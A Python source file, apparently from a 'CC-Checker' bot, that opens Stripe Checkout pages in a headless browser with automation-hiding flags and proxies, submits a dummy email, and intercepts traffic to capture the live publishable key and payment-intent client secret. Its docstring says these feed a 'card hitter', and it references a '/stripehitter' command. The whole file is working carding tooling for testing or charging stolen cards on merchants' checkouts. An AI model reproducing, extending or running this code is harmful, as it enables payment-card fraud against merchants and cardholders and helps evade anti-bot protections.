"""
core/stripe_extractor.py — Playwright-based Stripe Checkout Extractor

Uses a headless Chromium browser to:
1. Visit the Stripe checkout URL (fully renders JavaScript)
2. Intercept ALL network requests/responses from Stripe's API
3. Extract publishable key (pk_live_...) and client_secret (pi_xxx_secret_xxx)
4. Return everything needed for the card hitter

This works because Stripe's page JS makes XHR calls that include these keys
in the response — we intercept those calls before they reach Stripe.js.
"""
import asyncio
import re
import logging
from typing import Optional

logger = logging.getLogger("CC-Checker.StripeExtractor")

# Patterns to find in network traffic
PK_RE     = re.compile(r'pk_(?:live|test)_[a-zA-Z0-9]{20,}')
PI_RE     = re.compile(r'pi_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+')
SI_RE     = re.compile(r'seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+')
AMOUNT_RE = re.compile(r'"amount"\s*:\s*(\d+)')
CUR_RE    = re.compile(r'"currency"\s*:\s*"([a-z]{3})"')
MER_RE    = re.compile(r'"(?:merchantDisplayName|businessName|merchant_name)"\s*:\s*"([^"]{2,60})"')


async def extract_stripe_checkout(
    url: str,
    timeout_ms: int = 25000,
    proxy: Optional[str] = None,
) -> dict:
    """
    Open Stripe checkout URL in a headless browser, intercept network responses,
    and extract pk + client_secret automatically.

    Args:
        url:        Full Stripe checkout URL (checkout.stripe.com/c/pay/cs_live_...)
        timeout_ms: Max time to wait for data (default 25 seconds)
        proxy:      Optional proxy URL (http://user:pass@host:port)

    Returns dict with:
        pk, secret, intent_id, intent_type, amount, currency, merchant, session_id
    OR:
        {"error": "reason"}
    """
    try:
        from playwright.async_api import async_playwright, TimeoutError as PWTimeout
    except ImportError:
        return {
            "error": "Playwright not installed.\nRun: pip install playwright && playwright install chromium"
        }

    # Extract session ID from URL
    sid_m = re.search(r'(cs_(?:live|test)_[a-zA-Z0-9]+)', url)
    session_id = sid_m.group(1) if sid_m else ""

    # Collected data
    found = {
        "pk": "",
        "secret": "",
        "amount": 0,
        "currency": "USD",
        "merchant": "Unknown",
    }
    done_event = asyncio.Event()

    async with async_playwright() as pw:
        # Launch headless Chromium
        launch_kwargs = {
            "headless": True,
            "args": [
                "--no-sandbox",
                "--disable-dev-shm-usage",
                "--disable-blink-features=AutomationControlled",
                "--disable-infobars",
            ]
        }
        if proxy:
            launch_kwargs["proxy"] = {"server": proxy}

        browser = await pw.chromium.launch(**launch_kwargs)

        context = await browser.new_context(
            user_agent=(
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/125.0.0.0 Safari/537.36"
            ),
            viewport={"width": 1280, "height": 720},
            locale="en-US",
            timezone_id="America/New_York",
        )

        page = await context.new_page()

        # ── Intercept ALL responses from Stripe domains ───────────────────────
        async def on_response(response):
            try:
                resp_url = response.url
                # Only look at Stripe API responses
                if not any(d in resp_url for d in [
                    "stripe.com/api", "stripe.com/v1",
                    "checkout.stripe.com", "api.stripe.com"
                ]):
                    return

                # Read response body
                try:
                    body = await response.text()
                except Exception:
                    return

                if not body or len(body) < 10:
                    return

                # Search for PK
                if not found["pk"]:
                    pk_m = PK_RE.search(body)
                    if pk_m:
                        found["pk"] = pk_m.group(0)
                        logger.debug(f"PK found in {resp_url[:60]}: {found['pk'][:25]}...")

                # Search for PI/SI secret
                if not found["secret"]:
                    pi_m = PI_RE.search(body)
                    if pi_m:
                        found["secret"] = pi_m.group(0)
                        logger.debug(f"PI secret found in {resp_url[:60]}")
                    else:
                        si_m = SI_RE.search(body)
                        if si_m:
                            found["secret"] = si_m.group(0)
                            logger.debug(f"SI secret found in {resp_url[:60]}")

                # Extract amount
                if not found["amount"]:
                    amt_m = AMOUNT_RE.search(body)
                    if amt_m:
                        found["amount"] = int(amt_m.group(1))

                # Extract currency
                cur_m = CUR_RE.search(body)
                if cur_m:
                    found["currency"] = cur_m.group(1).upper()

                # Extract merchant name
                if found["merchant"] == "Unknown":
                    mer_m = MER_RE.search(body)
                    if mer_m:
                        found["merchant"] = mer_m.group(1)

                # If we have both pk and secret, we're done — signal early exit
                if found["pk"] and found["secret"]:
                    done_event.set()

            except Exception as e:
                logger.debug(f"Response handler error: {e}")

        page.on("response", on_response)

        # ── Navigate to checkout URL ──────────────────────────────────────────
        try:
            logger.info(f"Opening Stripe checkout: {url[:80]}...")
            await page.goto(url, wait_until="domcontentloaded", timeout=timeout_ms)
        except PWTimeout:
            logger.warning("Page navigation timed out (still checking collected data)")
        except Exception as e:
            logger.warning(f"Navigation error: {e}")

        # Wait for initial JS to execute and first network calls to complete
        await page.wait_for_timeout(4000)

        # ── Step 2: Fill email field to trigger PI creation ───────────────────
        # Stripe creates/reveals the PaymentIntent AFTER user fills email + clicks Continue
        if not found["secret"]:
            try:
                # Look for email input field
                email_selectors = [
                    'input[type="email"]',
                    'input[name="email"]',
                    'input[placeholder*="email" i]',
                    'input[id*="email" i]',
                    '#email',
                ]
                email_filled = False
                for sel in email_selectors:
                    try:
                        el = page.locator(sel).first
                        if await el.is_visible(timeout=2000):
                            await el.click()
                            await el.fill("test@gmail.com")
                            await page.wait_for_timeout(800)
                            email_filled = True
                            logger.debug(f"Email filled via selector: {sel}")
                            break
                    except Exception:
                        continue

                if email_filled:
                    # Click Continue/Next/Submit button
                    continue_selectors = [
                        'button[type="submit"]',
                        'button:has-text("Continue")',
                        'button:has-text("Next")',
                        'button:has-text("Pay")',
                        '[data-testid="hosted-payment-submit-button"]',
                        '.SubmitButton',
                    ]
                    for sel in continue_selectors:
                        try:
                            btn = page.locator(sel).first
                            if await btn.is_visible(timeout=2000):
                                await btn.click()
                                logger.debug(f"Clicked continue button: {sel}")
                                break
                        except Exception:
                            continue

                    # Wait for network responses after form submit
                    await page.wait_for_timeout(5000)
                    logger.info(f"After email step — PK: {'found' if found['pk'] else 'missing'}, Secret: {'found' if found['secret'] else 'missing'}")

            except Exception as e:
                logger.debug(f"Form interaction error: {e}")

        # Wait up to timeout for both pk and secret to be found
        try:
            await asyncio.wait_for(done_event.wait(), timeout=timeout_ms / 1000)
            logger.info("Both PK and secret found — extracting early")
        except asyncio.TimeoutError:
            logger.info(f"Timeout reached. PK: {'✅' if found['pk'] else '❌'}, Secret: {'✅' if found['secret'] else '❌'}")

        await browser.close()

    # ── Build result ──────────────────────────────────────────────────────────
    if not found["pk"]:
        return {
            "error": (
                "❌ Could not find publishable key (pk_live_...).\n\n"
                "Possible reasons:\n"
                "• Checkout link is expired/already paid\n"
                "• Stripe is detecting automation\n"
                "• Link was a test-mode link (pk_test_)"
            )
        }

    if not found["secret"]:
        return {
            "error": (
                f"⚠️ Found PK (`{found['pk'][:25]}...`) but no PI/SI secret.\n\n"
                "The payment intent secret was not found in network traffic.\n"
                "Try using manual keys:\n"
                "`/stripehitter pk_live_xxx pi_xxx_secret_xxx`"
            ),
            "pk": found["pk"],  # Return pk anyway for manual use
        }

    secret      = found["secret"]
    intent_id   = secret.split("_secret_")[0]
    intent_type = "setup" if secret.startswith("seti_") else "payment"

    return {
        "pk":          found["pk"],
        "secret":      secret,
        "intent_id":   intent_id,
        "intent_type": intent_type,
        "amount":      found["amount"] / 100 if found["amount"] else 0,
        "currency":    found["currency"],
        "merchant":    found["merchant"],
        "session_id":  session_id,
        "url":         url,
    }
